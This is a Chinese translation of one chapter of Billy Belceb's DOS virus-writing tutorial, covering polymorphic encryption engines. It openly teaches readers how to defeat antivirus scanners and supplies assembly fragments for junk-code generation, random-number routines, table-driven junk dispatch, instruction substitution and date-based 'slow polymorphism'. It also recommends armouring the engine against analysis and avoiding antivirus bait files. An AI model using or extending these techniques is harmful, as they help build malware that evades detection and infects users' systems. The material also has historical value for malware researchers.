
# Billy Belceb 病毒编写教程(DOS 篇)---多态(polymorphism)

> 原文：[`www.pediy.com/kssd/pediy06/pediy64069.htm`](https://www.pediy.com/kssd/pediy06/pediy64069.htm)

## 【多态(polymorphism)】

这是病毒里面最有意思的东西。编写一个 PER(Polymorphic Encryption Routine)也是非常有趣的，并且它将清楚地显示病毒编写者在编写它的“方式”。这也是所有的初学者所认为的非常难的东西，并且只有一个有经验的病毒编写者可以做到。不要这么认为！它非常的简单。不要害怕。如果你看到这里还活着的话，我肯定你将会看懂所有的东西。这一章是加密这一章的扩展。

我们做一个 PER 的目标是在病毒编写世界里从不停止的东西：通过尽可能地减小我们病毒地扫描字符串来击败病毒查杀工具，也就是 FUCK'EM ALL! :)这个概念就是在每次感染的时候产生不同的解密程序，所以病毒查杀工具在检测我们的病毒时将会受挫。并且这个技术，配合 STEALTH，AEMOURING，ANTI-HEURISTICS 和 ANTI-BAILTS 能使你的病毒更加强大。OK，让我们开始这个有意思的话题。

### %历史%

第一个想要编写一个 PER 的尝试的是由一个保加利亚人实现的，他可能是曾经最好的病毒编写者之一，叫做 Dark Avenger。他的病毒曾经，现在，将来都是所有病毒编写者学习的榜样。从他的初期的病毒，如 Eddie，他显示了编写代码的高质量。但是，最好的实现是伴随者 MtE(Mutation Engine)引擎的发布而出现的，在病毒史上第一个好的 PER。所有的病毒查杀工具研究者在寻找基于这个引擎的病毒的扫描字符串的时候，都快发疯了。在经过反病毒界艰苦卓绝的努力之后，它们终于找到了对付 MtE 的一个可靠的扫描字符串。但是，这才仅仅是噩梦的开始。Masud Khafir，TridenT 病毒研究组织的成员，开发了 TPE，Phalcon Skism 的 Dark Angel 开发了 DAME(Dark Angel Multiple Encrypto)，许多其他病毒研究者们开发了其它的很酷的引擎。当我们讨论多态引擎的时候，我们必须考虑到这项技术是在 1992 年出现的，很久以前的事情了。它们仅仅是对付扫描字符串的，这在如今，非常简单啦。

但是，如今，多态引擎有很多的敌人：代码分析，模拟，跟踪，诱骗，还有有经验的病毒查杀者在对付着我们。首先，病毒编写者认为我们的解密程序的最好的选择是使它尽可能的变化。但是，时间已经表明了这是一个错误的想法：病毒查杀者们将会感染成千的诱饵程序，为了看 PER 所能产生的所有可能的解密程序。如果我们有一小部分可能的解密程序泄露给它们(如利用日期来产生随机数)，我们正好迎合了他们的需要。他们有了一个扫描字符串，但是在另外一台计算机上，在另外一种情形下，这个扫描字符串就不起作用了。这就叫做 SLOW poly。我们将在这一章的另外一个地方看到。

### %介绍%

一个多态引擎是一个病毒编写者的最最私人的东西。这里我必须对你说使用另外一个病毒作者的多态代码并不是一个好主意。编写一个很好的 PER 非常的简单，但是如果你使用另外一个病毒编写者的代码，当你编写你的病毒的时候将会受限制了。

我们需要产生一个解密程序，在真正的解密代码里设置废代码，利用假的跳转，调用，反调试，所有我们想要的...让我们看看在编写我们的 PER 的时候必须要做的...

- 产生许多方法来达到同一目的
- 尽可能的改变我们的代码的顺序
- 可以在另外的病毒里可以使用
- 可以产生不做任何 INT 21h 功能的 Call
- 可以产生不做任何中断的 Call
- 如果能够，把它作成一个 slow poly
- 使所有的扫描字符串最小
- 利用 armour 保护指令产生器，使它在反汇编的时候非常困难。

当你在做一个 PER 的时候，想象力是一个非常好的武器。利用它产生你能产生的尽可能多的东西。

### %多态的第一步%

编写一个改变每一个病毒产生解密程序的最简单的方法是创建一个垃圾代码产生器，然后在一些不做任何事情的指令后面放置一些解密指令。如果你还没有创建一个引擎这是你能做的第一件事。第一种类型的垃圾代码是一个字节的代码，这些我们所能使用的简单的指令。我们在不做任何事情之前必须选择产生所有垃圾代码的寄存器。我通常使用 `AX`, `BX` 和 `DX`。让我们看看一个字节代码的一小小的表格：

```
  OneByteTable:
    db  09Eh      ;  sah
    db  090h      ;  nop
    db  0F8h      ;  clc
    db  0F9h      ;  stc
    db  0F5h      ;  cmc
    db  09Fh      ;  lahf
    db  0CCh      ;  int 3h
    db  048h      ;  dec ax
    db  04Bh      ;  dec bx
    db  04Ah      ;  dec dx
    db  040h      ;  inc ax
    db  043h      ;  inc bx
    db  042h      ;  inc dx
    db  098h      ;  cbw
    db  099h      ;  cwd
  EndOneByteTable:
```

利用设置真正指令的简单的例程，和其它的设置垃圾代码的例程，我们有一个非常简单的多态引擎。在我们的第一步中非常有用，但是，如果你正编写一个好病毒，你必须知道一件事情...如果有很多什么也不做的指令，要确信病毒查杀工具将会显示一个标志。Erhm...我们该这样得到其中的一个代码呢？相当简单：

```
  GenerateOneByteJunk:
    lea  si,OneByteTable   ; Offset of the table
    call  random     ; Must generate random numbers
    and  ax,014h     ; AX must be within 0 and 14 ( 15 )
    add  si,ax       ; Add AX ( AL ) to the offset
    mov  al, [si]     ; Put selected opcode in al
    stosb        ; And store it in ES:DI ( points to
                 ; the decryptor instructions )
    ret
```

毫无疑问，我们需要一个随机数产生器。下面给出一个最简单的：

```
  Random:
    in  ax,40h     ; This will generate a random number
    in  al,40h     ; in AX
    ret
```

利用上面的例程，我们所能做的是一个很差劲的引擎。我们的目标是其它的，所以请主意下面的讨论。

### %编写一个简单的操作的一些方法%

现在几乎有无穷的(当然不是啦...只是有成百万的可能性而已)方法来往常一个简单的指令任务。让我们想象一个"mov dx,1234h"，不使用其它的寄存器：

```
  mov  dx,1234h
  push  1234h
  pop  dx
  mov  dx,1234h xor 5678h
  xor  dx,5678h
  mov  dh,12h
  mov  dl,34h
  xor  dx,dx
  or  dx,1234h
  mov  dx,not 1234h
  not  dx
  [...]
```

而且我们还可以有更多的组合。毫无疑问，如果我们使用另外的寄存器来完成我们的任务，可能性就更多了。

### %改变指令的顺序%

用我们想要的顺序来编写代码有很多指令。而且，结合执行一个简单的代码的方法，能使我们的多态引擎真正的强大。

通常，在解密循环之前的指令可以按照任何顺序来排，除了所有的 PUSH/POP 组合，及相关的指令。我们现在讨论的是来完成这个任务的不依赖于其它任务的代码。让我们来看一个例子：

```
  mov  cx,encrypt_size
  mov  si,encrypt_begin
  mov  di,encrypt_key
```

我们可以按我们想要的顺序来安排这些指令，一个随机的顺序:)下面的代码能完成相同的任务：

```
  mov  di,encrypt_key
  mov  cx,encrypt_size
  mov  si,encrypt_begin
```

利用相同的方法，所有的组合可能都能达到相同的目的。

### %方便性(Portability)%

开发一个很轻便的多态引擎是很简单的。所有我们必须做的是使我们的 PER 使用参数。例如，我们可以使用 `CX` 来处理要加密的大小，`DS:DX` 指向要加密的代码。所以，用这个方法，我们就能在我们的病毒中使用我们的引擎。

### %Tables against Blocks%

基于 PER 的表：

这种类型的引擎的精神是把产生垃圾代码(一个字节的，假的中断调用，算术操作...)的例程的偏移地址写入另一个表格。然后，利用一个随机的值，我们调用这些偏移地址中的一个，产生一个随机的垃圾代码。让我们来看一个例子：

```
  RandomJunk:
    call  Random     ; Random number in AX
    and  ax,(EndRandomJunkTable-RandomJunkTable)/2
    add  ax,ax       ; AX*2
    xchg  si,ax
    add  si,offset RandomJunkTable ; Point to table
    lodsw
    call  ax       ; Call to random table offset
    ret

  RandomJunkTable:
    dw  offset GenerateOneByteJunk
    dw  offset GenerateMovRegImm
    dw  offset GenerateMovRegMem
    dw  offset GenerateMathOp
    dw  offset GenerateArmour
    dw  offset GenerateCalls
    dw  offset GenerateJumps
    dw  offset GenerateINTs
    [...]

  EndRandomJunkTable:
```

添加一个新的例程到一个基于 PER 的表非常简单，而且这种类型的引擎可以非常的优化(取决于代码编写者)。

基于 PER 的块：

我们的目标是为解密程序的每一个指令，分成一些固定长度的块。在 29A#2 由 Spanska 编写的 Elvira 病毒中，我们已经有这种引擎类型的例子了。让我们在 Elvira 引擎的一个块中看一个例子，它比较 `CX` 和 `0`。每一个块都有一个确定的大小(6 字节)。

```
  cmp cx, 0
  nop
  nop
  nop
  nop
  nop
  nop
  cmp cx, 0
  nop
  or cx, cx
  nop
  nop
  nop
  nop
  nop
  nop
  or cx, cx
  nop
  test cx, 0FFFFh
  nop
  nop
  or cl, cl
  jne suite_or
  or ch, ch
  suite_or:
  mov bx, cx
  inc bx
  cmp bx, 1
  inc cx
  cmp cx, 1
  dec cx
  nop
  dec cx
  cmp cx, 0FFFFh
  inc cx
  nop
```

正如你看到的，添加新块来完成相同的任务更简单。但是，这种类型的引擎有一个弱点：大小。Elvira 的引擎占了病毒的一半大小：病毒大小是 4250 字节，引擎占了病毒的 2000-2500 字节。好处是通过添加更多的块，我们可以为这个病毒设置更多的陷阱，使它仍然不能被病毒查杀工具检测:)

而赢家是...

我认为表是解决问题的方法，因为我们可以产生这些块的所有组合，还有更多。这些块也是那些不想生活在痛苦中的人的解决方案:)

**译者注**：下面省略一些汇编基础知识的介绍，包括寄存器的介绍，指令，中断调用等等，感兴趣的可看原文。

### %随机数产生器%

这是你的 PER 中的一个最重要的部分。获得随机数的最简单的方法是调用端口 `40h`，看它返回什么。让我们看一些代码：

```
  random:
    in  ax,40h
    in  al,40h
    ret
```

我们还可以使用 INT 1Ah，或者我们认为能每次返回给我们不同数的东西。如果我们想要得到一定范围的数，我们可以使用指令 AND。让我们来看看产生一定范围的随机数的最简单的过程：

```
  random_in_range:
    push  bx
    xchg  ax,bx
    call  random
    and  ax,bx
    pop  bx
    ret
```

它将会返回一个在 0 到 AX-1 之间的数。一个优化产生一个范围的随机数的方法是使用除法。记住除法能做什么，要特别注意余数。当我们做一个除法，余数不可能比除数大(活相等)。所以，余数只能在 0 到除数-1 之间。让我们看看使用除法的过程是怎么实现的：

```
  random_in_range:
    push  bx dx
    xchg  ax,bx
    call  random
    xor  dx,dx
    div  bx
    xchg  ax,dx
    pop  dx bx
    ret
```

正如你所看到的，相当简单。关于随机数的话题，我们在这一章的下一章还会继续，慢多态(Slow polymorphism)。

### %慢多态(Slow Polymorphism)%

如果你知道这个东西是如何对付病毒查杀工具的，你会认为它是一项非常难的技术，或者其它想法。不。第一个多态引擎的作者认为对付病毒查杀工具的方法是使解密在每次都是变化的。对于初期的 PER，这是一个很好的主意，但是，病毒查杀工具研究者们发现用一个具有多态的病毒感染成千的诱饵程序，他们就能发现所有的可能变异，然后，给他们的软件添加一个简单的扫描字符串。但是...如果我们使得解密程序非常慢的话，将会发生什么呢？于是，慢多态就应运而生了。是的，利用这个简单的想法，看起来不起眼，我们能使病毒查杀工具研究者们发疯了。为了获得慢多态我们必须改变的最重要的东西是随机数发生器。通过改变这个，我们就有了一个适合我们需要的慢变异引擎。我们可以证明它，但是它将和好地适合我们地需要。我们需要变化不快的值，如月，天或其它的一些东西，然后对他们玩些东西(如果你想要，毫无疑问了)。

```
  random_range:
    push  bx cx dx
    xchg  ax,bx
    mov  ax,2C00h
    int  21h
    xchg  ax,dx
    xor  ax,0FFFFh
    xor  dx,dx
    div  bx
    xchg  ax,dx
    pop  dx cx bx
    ret
```

利用上述的例程，你的 PER 现在是 100%慢多态了。我相信这个概念相当清晰了。

另外，你可以尝试着添加一个计数器来避免变异在一个很长的时间里完成，但是我更愿用这个技术来实现慢多态。

### %高级多态%

下一步是高级多态了，你必须试着去产生实际的结构，如一个调用子例程、中断的程序，和一些已知的数值玩玩，在条件跳转前面作比较，做任何你能想象的事情。你必须不断的提高的的多态引擎的变化性：如果它是慢的而且变化很多，病毒查杀工具将会受挫的。想象这个可能性：你可以自顶向底来解密你的代码，和使用 `si`, `di`, `bx` 或者其它你自己设定的作为记数寄存器，你可以为长例程添加一个发生器，如小的反调试花招(neg sp/neg sp,not sp/not sp...),编制一个 mid-virus(或者 mid-file)解密程序，一个 INT 1 解密程序，编制不做任何事情的内存移动，不时地把字运算作为字节运算，组合它们，代替它们...



此外，你可以尝试一些已经更高级地东西，如改进多态，和其它地东西。有一些关于这个事实的有趣的文章，如`Methyl`（即`Owl[FS]`）的。

%关于多态的最后的讨论%

但是，在现实中，病毒查杀工具开发者将会千方百计的通过反编译我们的慢多态引擎来获得我们解密程序的所有可能性。

但是，这里就要保护我们的成果了。我们必须通过一个特别地加密例程来严重地保护我们的`PER`（它必须是一个反调试地解密程序）。因为它们将不会有足够地时间来反编译我们地引擎，他们将看不到它所能做的所有东西:) 你可以好好地选择反调试这一章里里提到的反调试技术。所以，这次，它们将会把努力集中到诱饵上，并且我们必须避免感染这些无聊的文件。更多的关于这个在反诱骗这一章里;)

我期待着你能编写出震惊世界的`PER`!:)

`4dd466d0e1e0cc123afbe504da2462ca`
